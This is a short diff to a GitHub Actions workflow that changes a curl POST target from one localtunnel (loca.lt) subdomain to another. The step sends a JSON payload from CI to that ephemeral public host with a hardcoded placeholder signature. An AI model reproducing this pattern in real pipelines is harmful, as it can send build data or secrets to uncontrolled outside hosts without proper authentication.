@@ -285,8 +285,8 @@ jobs:
         if: ${{ always() && inputs.run_dev_test && contains(inputs.dev_test_branch, github.event.pull_request.base.ref) }}
         working-directory: ${{ github.workspace }}
         run: |
-          # curl -X POST https://bitter-lights-deny.loca.lt/data -H "Content-Type: application/json" -H "X-Signature: $hmac" -d "$json_payload"
-          curl -X POST https://bitter-lights-deny.loca.lt/data -H "Content-Type: application/json" -H "X-Signature: 123456789" -d "$json_payload"
+          # curl -X POST https://yellow-ads-begin.loca.lt/data -H "Content-Type: application/json" -H "X-Signature: $hmac" -d "$json_payload"
+          curl -X POST https://yellow-ads-begin.loca.lt/data -H "Content-Type: application/json" -H "X-Signature: 123456789" -d "$json_payload"
 
       - name: Technology based scans after step
         if: ${{ inputs.technology_based_scans_after_step_command != '' }}
